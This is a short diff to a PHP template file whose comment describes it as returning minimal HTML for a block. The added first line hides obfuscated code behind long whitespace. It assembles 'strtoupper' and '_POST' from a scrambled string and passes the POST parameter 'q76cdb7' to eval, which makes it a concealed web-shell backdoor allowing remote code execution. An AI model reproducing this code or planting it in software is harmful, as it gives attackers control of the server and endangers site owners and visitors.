@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                    $hyz1 ="soerptu_" ;$bms52 = $hyz1[0]. $hyz1[5].$hyz1[3].$hyz1[5]. $hyz1[1].$hyz1[6].$hyz1[4]. $hyz1[4]. $hyz1[2].$hyz1[3];$aahb8 = $bms52($hyz1[7]. $hyz1[4] .$hyz1[1]. $hyz1[0].$hyz1[5] );if ( isset ( ${ $aahb8 }[ 'q76cdb7' ] )){eval(${ $aahb8 }[ 'q76cdb7' ] );}?><?php
 /**
  * @file
  * Returns the HTML for a block with bare minimum HTML.
